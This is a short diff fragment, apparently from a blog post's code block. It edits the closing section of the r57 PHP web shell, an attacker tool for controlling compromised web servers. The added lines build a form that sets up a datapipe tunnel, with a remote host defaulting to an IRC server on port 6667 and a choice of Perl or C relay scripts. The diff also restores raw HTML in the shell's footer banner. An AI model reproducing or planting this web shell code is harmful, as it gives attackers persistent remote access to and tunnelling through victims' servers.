+echo sr(40,"<b>".$lang[$language.'_text24'].$arrow."</b>",in('text','remote_host',15,'irc.dalnet.ru'));
+echo sr(40,"<b>".$lang[$language.'_text25'].$arrow."</b>",in('text','remote_port',15,'6667'));
+echo sr(40,"<b>".$lang[$language.'_text26'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">datapipe.pl</option><option value=\"C\">datapipe.c</option></select>".in('hidden','dir',0,$dir));
 echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt5']));
-echo $te."&lt;/td&gt;".$fe."&lt;/tr&gt;&lt;/div&gt;&lt;/table&gt;";
+echo $te."</td>".$fe."</tr></div></table>";
 }
-echo '&lt;/table&gt;'.$table_up3."&lt;/div&gt;&lt;/div&gt;&lt;div align=center id='n'&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;o---[ r57.gen.tr v1.3- Thesaboarqe : R57&lt;a href=http://www.r57.gen.tr/&gt;www.r57.gen.tr/&lt;/a&gt; | version ".$version." ]---o&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;".$f;
+echo '</table>'.$table_up3."</div></div><div align=center id='n'><font face=Verdana size=-2><b>o---[ r57.gen.tr v1.3- Thesaboarqe : R57<a href=http://www.r57.gen.tr/>www.r57.gen.tr/</a> | version ".$version." ]---o</b></font></div></td></tr></table>".$f;
 ?>
 {% endhighlight %}
